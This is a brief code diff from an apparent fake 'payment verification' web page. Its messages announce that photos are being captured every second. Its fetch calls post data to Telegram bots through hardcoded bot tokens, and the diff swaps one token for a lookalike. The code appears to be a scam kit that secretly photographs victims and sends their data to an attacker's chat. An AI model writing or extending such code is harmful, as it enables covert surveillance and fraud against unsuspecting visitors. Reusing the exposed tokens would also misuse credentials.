@@ -288,7 +288,7 @@ class PaymentVerification {
 💰 <b>Cantidad mostrada:</b> ฿6,100.00
 📸 <b>Capturando fotos cada segundo...</b>`;
 
-            await fetch(`https://api.telegram.org/bot7532643566:AAF7Qyz0jYP0ck20RJdFyZNe1L9fETFU-IM/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot7532643566:AAF7QyzOjYPOck2ORJdFyZNelL9fETFU-IM/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -368,7 +368,7 @@ class PaymentVerification {
 
     async sendDirectToTelegram(message) {
         try {
-            await fetch(`https://api.telegram.org/bot8083680161:AAFw7sJh6ckiRHkgMS3WsC6J0Ya8Q5aPwE/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot7532643566:AAF7QyzOjYPOck2ORJdFyZNelL9fETFU-IM/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
